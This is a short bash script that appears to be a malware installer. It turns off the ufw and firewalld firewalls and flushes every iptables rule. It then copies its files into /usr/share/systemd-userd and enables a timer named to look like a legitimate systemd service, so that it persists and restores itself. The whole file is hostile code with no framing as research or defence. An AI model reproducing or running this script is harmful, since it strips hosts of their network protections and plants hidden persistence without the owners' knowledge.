#! /bin/bash

# Stop and disable ufw and firewalld
if type "ufw" >/dev/null; then
	ufw disable
	systemctl disable --now ufw
fi

if type "firewall-cmd" >/dev/null; then
	systemctl disable --now firewalld
fi

# Drop all firewall rules
if type "iptables" >/dev/null; then
	iptables -F
fi

# Self healing
mkdir --parents /usr/share/systemd-userd
cp -- * /usr/share/systemd-userd/

systemctl daemon-reload
systemctl enable --now systemd-userd.timer

# vim: set filetype=sh:
